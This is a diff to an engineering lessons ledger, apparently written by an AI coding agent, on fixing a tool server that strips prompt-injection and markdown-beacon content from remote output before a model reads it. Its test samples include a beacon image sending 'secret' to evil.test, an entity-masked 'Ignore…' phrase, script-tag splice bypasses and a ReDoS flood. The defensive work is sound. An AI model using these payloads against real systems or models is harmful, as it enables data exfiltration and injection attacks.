@@ -346,3 +346,400 @@ _(superseded by the line above; retained as filed)_ **Class:** `missing-validati
   *Tests* states the same rule for deny-lists, and it binds sweeps identically.
   A practical test: ask whether the query could match an instance nobody has seen
   yet. If it can only match code shaped like the example, it is not a sweep.
+
+### RC-7 — The recommended fix was inert, and the todo that carried it had been reviewed by three agents
+
+**Date:** 2026-09-02 · **PR:** (branch `fix/defend-undefended-tool-output`) · **Plan:** `docs/todos/001-jq-query-shorter-defence-path.md`
+
+**Class:** K-3 — *class-id:* `stale-observation`
+
+- **The plan said:** todo 001's recommended remedy, written up in three
+  numbered options with option 1 marked "the recommendation": call `defendText`
+  from `jq_query` passing `contentType: "application/json"`, "so the sniffer
+  stays off but the markdown/beacon stages still run."
+- **Reality was:** that call runs **no** strip stage at all. In `defendText`,
+  `application/json` makes `supportsMarkupComments` false, `isMarkdownContentType`
+  false and `isSniffableContentType` false — the last one deliberately, so
+  `looksLikeMarkupShape` never mangles a JSON string field. `needsStripPath` is
+  therefore false and Steps 3–5 are skipped entirely. Measured before writing
+  anything: `defendText('{"d":"see ![x](https://evil.test/?d=secret) end"}',
+  { contentType: "application/json" })` returns its input byte-identical. The
+  proposed fix and the defect it was written against produce the same bytes.
+- **What changed:** nothing was implemented from that option. The audit was
+  taken back to the director with the measurement, and the scope was re-cut
+  around what the code actually does — see RC-8 for the substantive half.
+- **What this costs next time:** **a remedy written into a todo is an untested
+  hypothesis, and reads exactly like a conclusion.** This one survived being
+  filed by one reviewer, cited by a second, and carried through three review
+  rounds and a merge, because at no point did anyone have a reason to run it —
+  the todo's job was to defer the work, and deferring is what everybody did.
+  The specific trap is that the sentence *"pass X so that Y still happens"* is
+  two claims wearing one clause: the first is a code change and the second is a
+  prediction about a function nobody re-read. Audit the *remedy* against HEAD
+  with the same suspicion as the plan's premises — `docs/compound/`'s Step 2
+  says "does the plan match reality", and a proposed fix is part of the plan.
+  It cost four minutes to check and would have cost a shipped no-op.
+
+### RC-8 — The instance was mis-scoped: the asymmetry was JSON-vs-everything, not jq_query-vs-curl_execute
+
+**Date:** 2026-09-02 · **PR:** (branch `fix/defend-undefended-tool-output`) · **Plan:** `docs/todos/001-jq-query-shorter-defence-path.md`
+
+**Class:** K-4, K-11 — *class-id:* `unescaped-sink`
+
+- **The plan said:** `jq_query` takes "a shorter defence path than `defendText`",
+  and its failure scenario compared the beacon it returns against the same
+  content "returned through `curl_execute` on a markdown response", which is
+  replaced with `[image removed]`. Severity P1, with an acceptance criterion
+  requiring a regression test that the beacon **is stripped**.
+- **Reality was:** `jq_query` cannot return non-JSON. `applyJqFilter` parses its
+  input with `JSON.parse` and throws otherwise, then returns
+  `JSON.stringify(...)`. And `defendText` on a JSON document *is*
+  sanitise-and-detect — the markup and markdown stages are excluded for JSON,
+  deliberately. So `jq_query` was already doing what `defendText` would have
+  done, and the like-for-like comparison is `curl_execute --jq_filter` on the
+  same file, which strips nothing either. The chosen comparator — a *markdown*
+  response — was the one content type that made the gap appear.
+
+  The genuine gap was the sibling instance the todo listed second and rated
+  "more serious": `post-processor.ts::processTextPart`, where the wrap is the
+  only defence for `registerCustomTool()` returns, `beforeRequest`
+  short-circuits and YAML endpoint results.
+- **What changed:** the wrap now calls `defendText` with
+  `contentTypeUndetermined: true` and `decodeEntities: false`. A module-private
+  `DEFENDED` symbol, set by `markDefended()` and claimed only by `curl_execute`'s
+  and `jq_query`'s SUCCESS returns, stops that from double-processing text
+  already defended under a real Content-Type. `jq_query` now calls
+  `defendText(contentType: JSON_MIME)` instead of reproducing its JSON arm, with
+  no behaviour change. **The strip-inside-JSON half was declined, not deferred** —
+  the exclusion is one decision applying identically to three call sites, it
+  governs bytes `save_to_file` persists and `jq_query` reads back, and closing it
+  is a different argument from the one the todo made. Pinned by tests in
+  `jq-query.test.ts` naming this RC, so a later round reads the decision rather
+  than re-opening it.
+- **What this costs next time:** **a comparator is part of a finding's evidence,
+  and picking the one that shows the gap is how a mis-scope survives review.**
+  The todo compared a JSON-only tool against a markdown response; against the
+  JSON response it can actually be given, the difference is zero. Before filing
+  "X is weaker than Y", state the input X actually accepts and re-run the
+  comparison on that. The second cost is smaller and sharper: **the instance a
+  finding is *named* after is not always the one that matters.** This todo's
+  title, id and P1 rating all pointed at `jq_query`; the live defect was in the
+  paragraph underneath, and it stayed open for the round that fixed the title.
+
+### RC-9 — The agreed fix was dropped after the code argued against it
+
+**Date:** 2026-09-02 · **PR:** (branch `fix/defend-undefended-tool-output`) · **Plan:** `docs/todos/001-jq-query-shorter-defence-path.md`
+
+**Class:** K-11 — *class-id:* `fail-open-default`
+
+- **The plan said:** the kickoff option the director chose included widening
+  `processor.ts::isDefinitelyJson` to recognise every JSON root — string, number,
+  boolean, null — not just `{` and `[`, so that jq output would be classified
+  consistently rather than by which path the caller happened to select.
+- **Reality was:** `isDefinitelyJson` also gates the **body** path in
+  `processResponse`, where the input is attacker-controlled. Widening it to
+  string roots would let a remote escape the strictest grammar by sending a body
+  that is exactly `"…beacon…"`, quotes included — one more spelling of an
+  already-accepted bypass, added to close a coherence problem that had a cheaper
+  answer. The predicate has two callers and the fix was designed against one.
+- **What changed:** nothing. `isDefinitelyJson` was left as it is. For an
+  untagged channel the narrow predicate errs *strict*, which is the safe
+  direction, and the coherence goal was met elsewhere.
+- **What this costs next time:** **before changing a shared predicate, name its
+  other callers and ask which direction each of them fails in.** The same
+  widening is safe on one side of this seam and a bypass on the other, and
+  nothing about the function says so. This is K-11 in its plainest form — the
+  fix landed on the defect's mirror — and the tell was that the predicate is
+  called from both a channel we own and a channel a remote fills.
+
+### RC-10 — A settled decision was reversed by an argument that had not been made when it was settled
+
+**Date:** 2026-09-02 · **PR:** (branch `fix/defend-undefended-tool-output`)
+
+**Class:** K-5 — *class-id:* `fail-open-default`
+
+- **The plan said:** RC-8, filed three hours earlier in this same run, declined
+  to strip markdown beacons inside JSON string values. Its reasoning:
+  `processResponse` writes post-strip content to disk and `jq_query` reads it
+  back, so stripping would silently alter a persisted document.
+- **Reality was:** that reasoning is sound and does not reach the
+  post-processor wrap. **The wrap's channels have no disk artefact** — a
+  `registerCustomTool()` return goes straight to the model — and a model renders
+  a beacon inside a JSON string value exactly as it renders one outside it.
+  RC-8 had reasoned about one call site's consequences and applied the
+  conclusion to all three. The same review also showed the exemption made the
+  defence depend on `include_metadata`: with it true the body sits inside a JSON
+  envelope the exemption protects, with it false it does not, so the same bytes
+  got two different treatments selected by an output-format flag.
+- **What changed:** `defendText` gained `excludeJsonDocuments`; the wrap passes
+  `false`. The split is now explicit — what is PERSISTED keeps the exemption,
+  what is RETURNED does not. `markDefended` and the `DEFENDED` symbol were
+  removed entirely in the same commit, because the incoherence they were built
+  to fix does not survive this change and their claim was worth less than it
+  looked (see the commit body).
+- **What this costs next time:** **a decision recorded with its reasoning can be
+  reopened by showing the reasoning does not reach a site; a decision recorded as
+  a verdict cannot.** RC-8 was reversed within hours precisely because it wrote
+  down *why* rather than *what*, which let a reviewer test the why against a
+  third call site and find it did not hold there. Per `03-divergence.md` a
+  reversal goes to the director rather than being applied — it did, and this RC
+  is the answer. **RC-8 stands for the body path and is not superseded**; only
+  its reach was wrong.
+
+### RC-11 — A guard's escape hatch was deleting the payload it was guarding
+
+**Date:** 2026-09-02 · **PR:** (branch `fix/defend-undefended-tool-output`)
+
+**Class:** K-2, K-5 — *class-id:* `silent-data-loss`
+
+- **The plan said:** nothing about this. `strip-blocks.ts` had carried
+  `<!--[\s\S]*?(?:-->|$)` since the strip path was written, and the docblock
+  explains the `|$)` arm as absorbing orphan openers to satisfy CodeQL's
+  "incomplete multi-character sanitization" rule. It reads as a completeness fix.
+- **Reality was:** the replacement is the empty string, so on an opener with no
+  closer that arm **deletes everything from the opener to end of input**.
+  Measured: `"before <!-- unclosed\nafter, real content"` → `"before "`. Silent —
+  no marker, no `isError`, no observable length delta, so a truncated result and
+  a genuinely short one are the same bytes. Same shape for unclosed `<script>`
+  and `<style>`. Pre-existing on the header and stderr channels; this branch
+  added the custom-tool channel, where unclosed markup in HTML is ordinary and
+  payloads are large.
+- **What changed:** balanced blocks are still removed whole; an orphan opener has
+  its TOKEN removed and its body stays as inert text. A test asserts no
+  `<script`/`</script`/`<style`/`</style`/`<!--` token survives any unclosed
+  shape, which is the property the `|$)` arm was actually carrying.
+- **What this costs next time:** **when a sanitiser's fallback arm is "consume
+  everything", ask what it consumes on a channel you are only a courier for.**
+  Deleting to end-of-input is a defensible reading for a body being neutralised
+  before a model reads it and indefensible for a payload the caller asked for,
+  and the same code served both. The general form: a guard written for one
+  channel's threat model gets reused as a primitive, and its most aggressive arm
+  is the one that travels worst.
+
+### RC-12 — Two channels' opposite needs were resolved by a per-caller flag, so every caller had to choose wrong
+
+**Date:** 2026-09-02 · **PR:** (branch `fix/defend-undefended-tool-output`)
+
+**Class:** K-13, K-11 — *class-id:* `unescaped-sink`
+
+- **The plan said:** RC-3 established `decodeEntities: false` for channels whose
+  consumer does not itself decode, because the decode's output is *returned* and
+  would manufacture live markup from inert bytes. The director chose to retire
+  the trade with a scratch copy: strip and detect see decoded text, the returned
+  text stays undecoded.
+- **Reality was:** the scratch copy does not resolve it, and finding out took
+  building it. The commit rule has to decide what counts as the decode having
+  "revealed" something. Keep it only when **markup was stripped**, and an
+  entity-masked injection phrase never reaches Step 5's detector and an
+  entity-masked `&#x200B;` never reaches the sanitiser — eight existing guards
+  fail, correctly. Widen it to "commit when detection fires", and RC-3 returns
+  exactly: the header case decodes an inert `&#x49;&#x67;nore…` into a live
+  phrase in returned text. The two channels want opposite things from the same
+  stage, and no single commit rule serves both.
+- **What changed:** the scratch-decode attempt was **reverted**, preserved in the
+  session scratchpad, and filed as `docs/todos/004`. What did land is the half
+  that is unambiguous: a JSON document is never entity-decoded, whatever the
+  origin declared. The sniffed arm already excluded JSON bodies; the
+  declared-markup arm did not, so one mislabelled `Content-Type` turned
+  `{"q":"a &#x22;b&#x22;"}` into `{"q":"a "b"}` — which no longer parses, and
+  which `save_to_file` persisted for `jq_query` to fail on.
+- **What this costs next time:** **a per-caller flag on a shared stage is a
+  record that the design question was not answered.** `decodeEntities` looked
+  like configuration and was actually two unreconciled requirements wearing one
+  parameter — K-13, the wording got more precise while the layer went unnamed.
+  The second lesson is about this run rather than the code: **an option accepted
+  as "costs nothing either way" is a claim, and mine was wrong.** I relayed a
+  reviewer's framing to the director without building it first. Prototype the
+  option you are about to recommend, or say plainly that you have not.
+
+### RC-13 — A finding was declined twice on a claim that was true only below a cap
+
+**Date:** 2026-09-02 · **PR:** #33 (branch `fix/defend-undefended-tool-output`)
+
+**Class:** K-11, K-1 — *class-id:* `fail-open-default`
+
+- **The plan said:** CodeQL's "incomplete multi-character sanitization" alerts on
+  `stripTagBlocks` were false positives, because `stripBlocksFixedPoint` re-runs
+  the pass until the output stops changing. That reply was written in review
+  round 1 and repeated verbatim in round 2, against four alerts each time.
+- **Reality was:** the loop is capped at four iterations, and a splice exposes
+  exactly one layer per pass. `"<scr".repeat(4) + "<script>" + "ipt>".repeat(4)`
+  returned a live `<script>` — the cap does not remove the class, it *sets the
+  surviving depth*, and the attacker picks the depth. The decline was true below
+  the cap and false above it, which is why re-reading the code confirmed it twice.
+- **What changed:** both the tag strip and the comment strip are single
+  left-to-right scans testing the OUTPUT tail after every character, so a token
+  spliced out of a removal's neighbours is examined on the next push and
+  convergence needs no iteration. Depth guards at 4, 5 and 40 for both tags,
+  each verified to fail with the scan reverted to a `replace`.
+- **What this costs next time:** **the round-2 fix for the comment path was the
+  same defect, and it was applied one commit before the block-path decline was
+  repeated.** Codex reported "five splice layers beat the four-pass cap" for
+  `<!--`; that was accepted and fixed. CodeQL reported the identical shape for
+  `<script>` in the same round and was declined. One reviewer's phrasing was
+  believed and another's was not, for the same defect, in the same commit —
+  K-11, the mirror side of a two-sided claim. **When a fix is applied to one
+  member of a set, re-open every finding already declined about the other
+  members**, because the decline was written before the fix existed.
+
+---
+
+### RC-14 — A bound was proved sound for the region and not for the attempt
+
+**Date:** 2026-09-02 · **PR:** #33 (branch `fix/defend-undefended-tool-output`)
+
+**Class:** K-11, K-4 — *class-id:* `unbounded-growth`
+
+- **The plan said:** after round 3, `strip-blocks.ts` was linear. The argument
+  was written into `withinClosableRegion`'s docblock as **"sound, not
+  approximate"**: no match can begin after the last closer, so bounding the
+  pass at that closer changes no output and every attempt inside the region has
+  a closer ahead of it and cannot fail by scanning to the end.
+- **Reality was:** the second half of that sentence does not follow from the
+  first. *Having* a closer ahead is not the same as being able to *reach* it.
+  The opener `<script\b[^>]*>` has an attribute run that crosses `<`, so on
+  `"<script".repeat(30000) + "</script>"` each opener consumed the region's one
+  and only closer as its own opening-tag terminator, then searched to
+  end-of-input for a second closer that did not exist. **2881 ms measured on a
+  205 KB body, inside a bound that was computed correctly.** Reported by
+  `chatgpt-codex-connector` on review round 4, against `7caedd7`.
+- **What changed:** the opener's attribute run is now `[^<>]*`, matching the
+  closer's and `lastTagCloserEnd`'s. Three ReDoS cases added — the axis every
+  earlier flood structurally could not produce, since each either omitted the
+  closer (empty region, pass never runs) or gave every opener its own `>`.
+  2881 ms → 9 ms. All three verified to fail with the class reverted.
+- **What this costs next time:** **round 2 fixed this exact class on the closer
+  and left the opener, and the round-2 note explicitly argued the asymmetry was
+  safe** — *"excluding `<` from a CLOSER is safe in a way it is not for an
+  opener"*. That sentence was written while looking at the defect from one
+  side, and it is the reason nobody checked the other. K-11 again, one round
+  after RC-13 named it, which is what makes this worth a second entry rather
+  than a footnote on the first: **naming a shape does not make the next
+  instance visible, and both instances here were found by a reviewer rather
+  than by the sweep the previous RC prescribed.** The sweep that would have
+  found it is mechanical and takes a minute: *for every repeated character
+  class, list every token the match must still consume after it, and check the
+  class against all of them.* For the script/style opener that is `<` and `>`,
+  which is why the class is `[^<>]*`. Excluding them all is sufficient rather
+  than necessary — the real bar is that failing attempts partition the input —
+  so a class that does not exclude one owes that argument in writing plus a
+  flood case. The markdown label class is the worked example: it does not
+  exclude `(` or `)`, and it is linear anyway because excluding `[` makes every
+  attempt start at a `[` and every failing scan end at the next `[` or `]`. It
+  is the acceptance criterion in `docs/todos/005`.
+
+  **The first wording of that criterion said "the token the match must NEXT
+  reach", and would have passed the very defect it was written for** — the next
+  token after `<script\b[^>]*` is `>`, and `[^>]*` excludes `>`. Caught by
+  coderabbitai in round 4, hours after it was written. A rule derived from a
+  fix rather than from the fix's *class* inherits the fix's blind spot: K-1, on
+  the remedy this time rather than on a test.
+
+---
+
+### RC-15 — A cap measured its input where the pipeline grows its output
+
+**Date:** 2026-09-02 · **PR:** #33 (branch `fix/defend-undefended-tool-output`)
+
+**Class:** K-11 — *class-id:* `broken-contract`
+
+- **The plan said:** `max_result_size` bounds what is surfaced inline, and
+  invariant 14 already said in terms that "the cap is applied after the defence
+  pipeline as well as before it, since `[link removed]` is longer than some of
+  the forms it replaces". The invariant was written; the code was not.
+- **Reality was:** this PR added a second defence pass at the post-processor
+  wrap, downstream of every size gate. A `text/plain` body of
+  `"[a](file:)".repeat(100)` — exactly 1000 bytes under a 1000-byte cap — stayed
+  inline and reached the model as **1400 bytes**, with the gate reporting
+  compliance. Reported by `chatgpt-codex-connector` in round 1 and independently
+  by `coderabbitai` in round 2, which read it out of this branch's own handoff.
+- **What changed:** `processor.ts::exceedsInlineCap` asks the question a size
+  gate has to ask — *will this still be over the cap after the defence?* — and
+  both `processResponse` and `executeJqQuery` gate on it. Over-cap now saves to
+  a file, and the returned preview is the defended form, because truncating the
+  raw form would leave the wrap free to grow it back over the limit.
+- **What this costs next time, in three parts:**
+
+  **The obvious fix was the wrong one, and the measurement is what said so.**
+  "Plumb the cap into the wrap" is the natural reading, and at the wrap the body
+  is already inside `formatResponse`'s JSON envelope — a compliant 1000-byte
+  body arrives as a **1057-byte** text part under `include_metadata`. A wrap-side
+  cap would truncate every correct metadata response, mid-JSON. **A cap has to
+  be applied where the quantity it names still exists**, and `max_result_size`
+  names the body, not the envelope.
+
+  **A measurement acquired a side effect and the suite caught it.** The first
+  version ran the full defence to weigh it, and that pass calls
+  `sanitizeAndDetect`, which logs — silently converting a documented
+  detect-on-original trade-off into a log line. The fix is two cheap arms that
+  answer without the pass: already-over, and growth bounded by the placeholder
+  ratio being unable to reach the cap. **A predicate that needs a side-effecting
+  pass to answer should run it only where it can change the answer.**
+
+  **And the first regression guard for the jq channel was toothless — the fifth
+  on this branch.** It computed the cap with `JSON.stringify`, but jq
+  pretty-prints with a two-space indent, so the assumed 530 bytes were really
+  642: the result was already over the cap on its own size and saved to file
+  with the fix reverted exactly as it did with the fix in. It passed for the
+  wrong reason. **Derive a fixture's boundary from a real call, never from a
+  re-implementation of what the code under test does.**
+
+### RC-16 — The defence paired tokens across the boundary it could not see
+
+**Date:** 2026-09-02 · **PR:** #33 (branch `fix/defend-undefended-tool-output`)
+
+**Class:** K-5 — *class-id:* `unwrapped-multi-write`
+
+- **The plan said:** the wrap defends "every piece of remote-origin text", and
+  `defendForInline` was written as one call over one string. Invariant 1a
+  reasoned about *which stages* run on a channel and never about *how many
+  regions* the string it was handed contains.
+- **Reality was:** by the wrap, `formatResponse` has sealed body, headers and
+  stderr into one JSON envelope — the same fact RC-15 measured a week earlier
+  and read only for its size. The strip stages pair an opening token with a
+  closing one and cannot see JSON syntax, so an opener in `response` and a
+  closer in `headers` deleted everything between them, **the `headers` key
+  included**. Measured: `{"note":"budget <!-- draft"}` as the body with
+  `x-trace: a-->b` in the headers returned an envelope with no `headers` key at
+  all, and `{"a":"open <!--","b":"close -->","c":"kept"}` — one document, no
+  envelope, the `jq_query` shape — came back as `{"a":"open ","c":"kept"}`.
+- **What I did:** `defendForInline` now parses a JSON document and defends each
+  string LEAF, then re-serialises; the undivided scan is the arm for text that
+  is not JSON. Invariant 16 states the property. Object keys are left alone
+  deliberately — two keys defending to the same string would collapse into one,
+  which is the loss this fix exists to prevent.
+- **And the fix's first version broke invariant 14**, which is why this RC has
+  two halves. Indenting whenever the input held a newline re-inflated a sparsely
+  formatted document by its nesting depth — 53 bytes in, 140 out, against a
+  growth ratio that believes the ceiling is 15/9 — so `exceedsInlineCap`'s cheap
+  arm would have reported compliance for a body reaching the model over its cap.
+  **The obvious repair was worse:** gating that arm on `isDefinitelyJson` made
+  the measurement run the full pass, which logs, and the suite failed on a test
+  asserting silence — RC-15's own second lesson, arriving from the opposite
+  direction one round later. What holds is a comparison against the input, which
+  needs no constant at all: indent only where indenting does not grow the
+  document.
+- **Files:** `src/lib/response/processor.ts` (`defendForInline`,
+  `defendInlineString`, `defendJsonLeaves`, `parseJsonDocument`),
+  `src/lib/response/post-processor.test.ts`, `ARCHITECTURE.md` invariant 16.
+
+**The output stayed valid JSON, and that is the whole reason this survived four
+review rounds and a rewrite of the surrounding prose.** A corruption that
+produces a parse error announces itself; this one produced a smaller,
+well-formed document that every consumer accepted. **Where a defence can delete,
+the test is not "does the result parse" but "are all the parts still there".**
+
+**RC-15 and RC-16 are the same observation read twice.** Both rest on the
+envelope existing at the wrap; RC-15 asked how big it was and shipped, and
+nobody asked what was inside it. **A fact established for one question is worth
+re-interrogating for the next** — the measurement was already in the ledger.
+
+**Invariant 13 already stated this property one layer down** and did not reach
+here. It says a boundary between remote-controlled regions never comes from the
+bytes themselves; the header/body split obeys it, and then the reassembled
+envelope was handed to a pass that had no notion of regions at all. **A rule
+stated about one seam does not travel to the next one by itself** — K-13, and
+invariant 16 is where the general form now lives.
+
+Reported by chatgpt-codex-connector on PR #33 round 5, graded P1 by them and
+confirmed P1 here on the data-loss calibration.
